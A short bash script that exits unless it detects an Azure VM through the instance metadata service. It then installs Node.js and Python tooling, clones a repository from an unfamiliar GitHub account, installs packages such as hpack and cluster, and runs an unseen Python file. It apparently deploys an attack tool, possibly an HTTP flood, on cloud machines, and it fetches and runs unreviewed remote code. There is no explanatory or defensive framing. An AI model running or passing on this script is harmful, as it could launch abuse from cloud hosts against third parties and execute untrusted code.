#!/bin/bash

# Check if it's Azure VPS
curl -s -H Metadata:true --connect-timeout 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > /dev/null || exit

# Install dependencies
sudo apt-get update
sudo apt-get install -y git nodejs python3 python3-pip

# Install npm cluster globally
npm install -g cluster

# Clone and setup
git clone https://github.com/vrbrh921-glitch/Fc.git
cd Fc

# Install npm dependencies
npm install cluster hpack chalk 

# Install Python packages
pip3 install requests py

# Run the Python script
python3 m.py
